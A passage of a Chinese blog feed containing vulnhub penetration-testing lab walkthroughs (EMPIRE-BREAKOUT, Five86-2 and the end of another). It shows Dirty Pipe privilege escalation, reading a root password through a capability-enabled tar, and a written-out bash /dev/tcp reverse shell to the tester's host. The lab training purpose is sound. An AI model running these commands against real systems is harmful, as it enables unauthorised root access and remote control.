title="5)分析图片"></a>5)分析图片</h4><p>我们访问图片</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.135/.cypher-neo.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127214218700.png" alt="image-20240127214218700"></p><p>问题就是它了，网站上看不出来问题下载下看看，这里用到了一下图片隐写的知识</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://192.168.52.135/.cypher-neo.pngbinwalk .cypher-neo.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127214457908.png" alt="image-20240127214457908"></p><p>！！！！捆绑好家伙行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">binwalk <span class="token parameter variable">-e</span> .cypher-neo.png --run-as<span class="token operator">=</span>root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127214753334.png" alt="image-20240127214753334"></p><p>研究了半天都没有研究出来什么东西，我们直接进行提权看看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127221919347.png" alt="image-20240127221919347"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127222202901.png" alt="image-20240127222202901"></p><h4 id="6-进行提权"><a href="#6-进行提权" class="headerlink" title="6)进行提权"></a>6)进行提权</h4><p>查看一下当前linux的内核版本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127222852117.png" alt="image-20240127222852117"></p><p>系统是Linux4.x|5.x看看有没有漏洞能利用，直接发现有漏洞能直接用CVE-2022-0847</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://github.com/r1is/CVE-2022-0847<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载下去直接传上去跑就行（蚁剑直接传上去就可以了）（或者使用shell直接到靶机里）,给权限直接跑</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127224523016.png" alt="image-20240127224523016"></p><p>蚁剑里面有bug，我们反弹shell，在kali里面进行</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127225053522.png" alt="image-20240127225053522"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127225211867.png" alt="image-20240127225211867"></p><p>我们可以看到提权已经是root了，我们直接查看flag即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127225252646.png" alt="image-20240127225252646"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127225316320.png" alt="image-20240127225316320"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.burp工具的使用</p><p>10.kali反弹shell</p><p>11.蚁剑的使用</p><p>12.gobuster.ffuf</p><p>13.binwalk工具的使用</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之EMPIRE-BREAKOUT</title>
    <link href="http://ms02423.top/2024/01/15/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BEMPIRE-BREAKOUT/"/>
    <id>http://ms02423.top/2024/01/15/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BEMPIRE-BREAKOUT/</id>
    <published>2024-01-15T12:18:46.000Z</published>
    <updated>2024-01-29T15:45:26.122Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">DescriptionBack <span class="token keyword">to</span> the <span class="token keyword">Top</span>Difficulty<span class="token punctuation">:</span> EasyThis box was created <span class="token keyword">to</span> be an Easy box<span class="token punctuation">,</span> but it can be Medium <span class="token keyword">if</span> you get lost<span class="token punctuation">.</span><span class="token keyword">For</span> hints discord Server <span class="token punctuation">(</span> https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>discord<span class="token punctuation">.</span>gg<span class="token operator">/</span>7asvAhCEhe <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场地址"><a href="#2-靶场地址" class="headerlink" title="2.靶场地址"></a>2.靶场地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>empire-breakout<span class="token punctuation">,</span><span class="token number">751</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115202624114.png" alt="image-20240115202624114"></p><h2 id="3-启动靶场"><a href="#3-启动靶场" class="headerlink" title="3.启动靶场"></a>3.启动靶场</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115202638120.png" alt="image-20240115202638120"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.52.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115202948264.png" alt="image-20240115202948264"></p><pre class="line-numbers language-none"><code class="language-none">arp-scan -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115203526580.png" alt="image-20240115203526580"></p><p>靶场真实ip地址为192.168.52.134</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-A</span> <span class="token parameter variable">-v</span> -p- <span class="token number">192.168</span>.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115203205199.png" alt="image-20240115203205199"></p><p>这里我们不使用这个命令，这个命令看起来太麻烦了，我们使用另一个命令，更加直观</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115203444747.png" alt="image-20240115203444747"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">80</span>端口，APache httpd <span class="token number">2.4</span><span class="token number">.51</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Debian<span class="token punctuation">)</span><span class="token punctuation">)</span>发现开启了<span class="token number">139,445</span>端口，Samba smbd <span class="token number">4.6</span><span class="token number">.2</span>发现开启了<span class="token number">10000,20000</span>端口， MiniServ <span class="token number">1.830</span> <span class="token punctuation">(</span>Webmin httpd<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>也可以使用masscan进行探测</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115203636268.png" alt="image-20240115203636268"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204012504.png" alt="image-20240115204012504"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204153015.png" alt="image-20240115204153015"></p><p>是一个apache2页面，我们查看源码，可以看到一个加密的过后的字符串，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204250195.png" alt="image-20240115204250195"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115205820955.png" alt="image-20240115205820955"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.2uqPEfj3D<span class="token operator">&lt;</span>P'a-3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这应该是一个密码，先记录下来，接着我们继续查看另外两个网站</p><p> 10000端口和20000端口是不同的登录系统，一个是登录网站的，一个是登录用户的</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204936324.png" alt="image-20240115204936324"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204954830.png" alt="image-20240115204954830"></p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204419404.png" alt="image-20240115204419404"></p><p>没有有用的信息</p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204742223.png" alt="image-20240115204742223"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204808713.png" alt="image-20240115204808713"></p><p>但是没有什么用</p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.52.134 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115205327708.png" alt="image-20240115205327708"></p><p>没有任何信息</p><h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-enum4linux-收集用户"><a href="#1-enum4linux-收集用户" class="headerlink" title="1)enum4linux 收集用户"></a>1)enum4linux 收集用户</h4><p>我们已经有了用户的密码，所以我们要着手寻找用户名了,由于靶机开放了smb服务，所以我们可以收集有关靶机smb的信息, 使用命令enum4linux可以收集大量的信息</p><p>Enum4linux 是一个用于枚举和收集信息的开源工具，特别是在Windows环境下进行。它设计用于与SMB&#x2F;CIFS（Server Message Block&#x2F;Common Internet File System）协议交互，该协议通常用于在Windows网络中共享文件和打印机。<br>以下是 Enum4linux 的主要功能：<br>用户和组枚举： Enum4linux 可以列出目标系统上的用户和组，包括一些敏感信息，如用户ID（UID）、组ID（GID）、用户描述等。<br>共享枚举： 它可以枚举目标系统上的共享资源，包括共享名称、共享路径和共享类型。<br>策略枚举： 工具可以提取目标系统的安全策略信息，包括密码策略和帐户锁定策略。<br>会话和会话枚举： 它可以列举活动会话，显示与系统相关的用户信息。<br>操作系统版本信息： Enum4linux 试图识别目标系统的操作系统版本。</p><pre class="line-numbers language-none"><code class="language-none">enum4linux 192.168.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115210318907.png" alt="image-20240115210318907"></p><p>获得了一个用户名cyber</p><h4 id="2-登录用户名"><a href="#2-登录用户名" class="headerlink" title="2)登录用户名"></a>2)登录用户名</h4><p>登录一下20000端口,登录进去一看，发现左下角有一个终端的图标，点进去之后就可以运行命令了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115210853717.png" alt="image-20240115210853717"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115210944182.png" alt="image-20240115210944182"></p><p>我们可以找到第一个flag</p><h3 id="4-提权"><a href="#4-提权" class="headerlink" title="(4)提权"></a>(4)提权</h3><p>我们查看权限，不是root权限，我们进行提权</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115211201249.png" alt="image-20240115211201249"></p><p>我们先反弹shell</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115211424046.png" alt="image-20240115211424046"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115211412338.png" alt="image-20240115211412338"></p><p>我们可以看到反弹成功</p><p>除了user.txt,还发现一个 tar 文件，查看一下文件的相关属性</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115211811673.png" alt="image-20240115211811673"></p><p>突然给这么一个可运行文件肯定是有深意的，我们看一下这个文件拥有的权限是什么</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">getcap <span class="token function">tar</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115212155675.png" alt="image-20240115212155675"></p><p>getcap是一个Linux命令，用于获取文件的能力（capabilities）信息。在Linux中，能力是一种粒度更细的权限系统，用于授予进程执行特定操作的权限，而不是传统的用户和组权限模型。</p><p>发现有 cap_dac_read_search&#x3D;ep 功能，能读取文件，发现它是可以读取任意文件的,有关linux setcap命令的信息,查看下面链接</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;iamfy&#x2F;archive&#x2F;2012&#x2F;09&#x2F;20&#x2F;2694977.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>后来在 &#x2F;var&#x2F;backups 目录下发现了一个密码备份文件：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115212857546.png" alt="image-20240115212857546"></p><p>其实如果我们想在kali里面寻找文件，我们可以使用如下命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token parameter variable">-name</span> <span class="token string">"*bak*"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115213621962.png" alt="image-20240115213621962"></p><p>只能由root用户读取，不过之前发现 tar 可以读取任意文件，那就用 tar 读取文件</p><p>tar tar -tvf archive.tar</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115213856570.png" alt="image-20240115213856570"></p><p>我们用tar把它打包之后再解压出来，就没有权限问题了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./tar <span class="token parameter variable">-cvf</span> MS02423.tar /var/backups/.old_pass.bak <span class="token function">tar</span> <span class="token parameter variable">-xvf</span> MS02423.tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115215554730.png" alt="image-20240115215554730"></p><p>cat之后获得了root密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115215623797.png" alt="image-20240115215623797"></p><p>我们登录root，但是发现这里有bug</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115220415090.png" alt="image-20240115220415090"></p><p>那么我们就反弹shell</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115222410774.png" alt="image-20240115222410774"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/192.168.52.152/666666 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115220344317.png" alt="image-20240115220344317"></p><p>可反弹成功，在此登录root就可以看到最终的flag了</p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.enum4linux 工具的使用</p><p>10.kali反弹shell</p><p>11.tar</p><p>12.getcap</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之Five86-2</title>
    <link href="http://ms02423.top/2024/01/13/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFive86-2/"/>
    <id>http://ms02423.top/2024/01/13/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFive86-2/</id>
    <published>2024-01-13T09:48:36.000Z</published>
    <updated>2024-01-14T14:00:12.755Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Five86-2 <span class="token keyword">is</span> another purposely built vulnerable lab <span class="token keyword">with</span> the intent <span class="token keyword">of</span> gaining experience <span class="token keyword">in</span> the world <span class="token keyword">of</span> penetration testing<span class="token punctuation">.</span>The ultimate goal <span class="token keyword">of</span> this challenge <span class="token keyword">is</span> <span class="token keyword">to</span> get root <span class="token operator">and</span> <span class="token keyword">to</span> <span class="token keyword">read</span> the one <span class="token operator">and</span> only flag<span class="token punctuation">.</span>Linux skills <span class="token operator">and</span> familiarity <span class="token keyword">with</span> the Linux command <span class="token keyword">line</span> <span class="token keyword">are</span> a must<span class="token punctuation">,</span> <span class="token keyword">as</span> <span class="token keyword">is</span> some experience <span class="token keyword">with</span> basic penetration testing tools<span class="token punctuation">.</span><span class="token keyword">For</span> beginners<span class="token punctuation">,</span> Google can be <span class="token keyword">of</span> great assistance<span class="token punctuation">,</span> but you can always tweet me <span class="token keyword">at</span> @DCAU7 <span class="token keyword">for</span> assistance <span class="token keyword">to</span> get you going again<span class="token punctuation">.</span> But take note<span class="token punctuation">:</span> I wo<span class="token string">n't give you the answer, instead, I'</span>ll give you an idea about how <span class="token keyword">to</span> <span class="token keyword">move</span> forward<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个flag</p><h2 id="2-靶场地址"><a href="#2-靶场地址" class="headerlink" title="2.靶场地址"></a>2.靶场地址</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/five86-2,418/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113205448765.png" alt="image-20240113205448765"></p><h2 id="3-启动环境"><a href="#3-启动环境" class="headerlink" title="3.启动环境"></a>3.启动环境</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113205423777.png" alt="image-20240113205423777"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.52.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113210129437.png" alt="image-20240113210129437"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113210452368.png" alt="image-20240113210452368"></p><p>靶场真实ip地址为192.168.52.133</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-A</span> <span class="token parameter variable">-v</span> -p- <span class="token number">192.168</span>.52.133<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113210410583.png" alt="image-20240113210410583"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">21</span>端口， ProFTPD <span class="token number">1.3</span><span class="token punctuation">.</span>5e发现开启了<span class="token number">80</span>端口，Apache httpd <span class="token number">2.4</span><span class="token number">.41</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以使用masscan进行探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan <span class="token parameter variable">--rate</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token parameter variable">--ports</span> <span class="token number">0</span>-65535 <span class="token number">192.168</span>.52.133<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113210542180.png" alt="image-20240113210542180"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.52.133<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113210841008.png" alt="image-20240113210841008"></p><p>我们可以看到有wordpress框架，看来是需要爆破的</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.133<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>感觉页面好像不对劲，显示也有点问题</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113210939830.png" alt="image-20240113210939830"></p><p>点击其他链接的时候，会跳转到一个域名，但是无法访问，一般出现这个情况，应该是要设置本地的hosts文件，加上192.168.52.133  five86-2 即可，kali修改&#x2F;etc&#x2F;hosts文件即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113211209004.png" alt="image-20240113211209004"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113211231658.png" alt="image-20240113211231658"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113211253423.png" alt="image-20240113211253423"></p><p>现在可以看到页面显示正常了</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.52.133<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113211447685.png" alt="image-20240113211447685"></p><p>看来是wordpress，我们需要爆破用户名和密码</p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.52.133<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113211945590.png" alt="image-20240113211945590"></p><p>我们访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.133/wp-login.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113212042983.png" alt="image-20240113212042983"></p><p>wordpress的登录页面</p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.52.133 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113212247939.png" alt="image-20240113212247939"></p><p>只有wp-login.php是有用的，所以接下来我们进行爆破用户名和密码</p><h3 id="3-登录wordpress"><a href="#3-登录wordpress" class="headerlink" title="(3)登录wordpress"></a>(3)登录wordpress</h3><h4 id="1-爆破用户名"><a href="#1-爆破用户名" class="headerlink" title="1)爆破用户名"></a>1)爆破用户名</h4><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Wpscan一些常用语句：wpscan --url http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xxxxwpscan --url http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xxx --enumerate t 扫描主题wpscan --url http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xxx --enumerate p 扫描插件wpscan --url http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xxx --enumerate u 枚举用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://five86-2 <span class="token parameter variable">--enumerate</span> u <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113212829410.png" alt="image-20240113212829410"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113212901529.png" alt="image-20240113212901529"></p><p>爆破出来5个用户名</p><p>接下来我们制作字典</p><h4 id="2-制作字典"><a href="#2-制作字典" class="headerlink" 